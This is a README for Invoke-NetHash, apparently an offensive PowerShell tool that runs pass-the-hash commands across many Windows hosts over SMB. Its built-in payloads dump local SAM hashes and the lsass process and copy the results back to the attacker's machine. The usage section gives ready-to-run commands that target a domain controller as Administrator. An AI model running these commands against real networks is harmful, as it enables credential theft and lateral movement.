# Invoke-NetHash - The basic idea

The function of Invoke-NetHash is based on the idea to execute commands on a high number of clients by use of the NT Hash. 

The engine for the whole process is the awsome Invoke-SMBExec script (written by @kevin_robertson). What Invoke-NetHash adds is a parallely execution of Invoke-SMBExec with a wide range of possible inputs. 
Next to the possability to execute custom commands I added builtin functions which are quite handy for penetration testing. 

* Invoke-PowerDump - originally written by Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K) - I added support for the latest Windows versions so by use of this function the NT Hashes of the local accounts can be extracted from the registry.
* Invoke-LSADump - a very handy oneliner to dump the LSA Process

If those payloads are used in combination with Invoke-NetHash - the function (e.g. PowerDump) will be executed on every host targeted, the result written to a file and copied back to the attacker host.
For this whole process the script relies on SMB shares - it will create an share and will remove if after the run completed. This share is used to load the payload and to transfer the result of the different targets. 

I hope this scripts brings some use to you.

# Usage 

The simplest usage is to use the built in functions for PowerDump (the extraction of hashes from the local SAM Database aka the registry) or LSADump which creates a dump of the lsass process of the remote computer.

## PowerDump

The fastest command for the usage against a single target is:
```powershell
 Invoke-NetHash -Hosts dc -Username 'Administrator' -Hash 'e19ccf75ee54e06b06a5907af13cef42' -Powerdump $true -UserDomain "contoso.local" -WriteVerbose $true
```

## LSADump 

The fastest command for the usage against a single target is:
```powershell
 Invoke-NetHash -Hosts dc -Username 'Administrator' -Hash 'e19ccf75ee54e06b06a5907af13cef42' -LSAdump $true -UserDomain "contoso.local" -WriteVerbose $true
```

# Future Plans

Currently the script is very raw and will be enhanced down the road (some things are quite ugly but it is working and I will replace those part with time) - next to the code itself I plan to integrate an interactive shell triggered by SMBExec.
 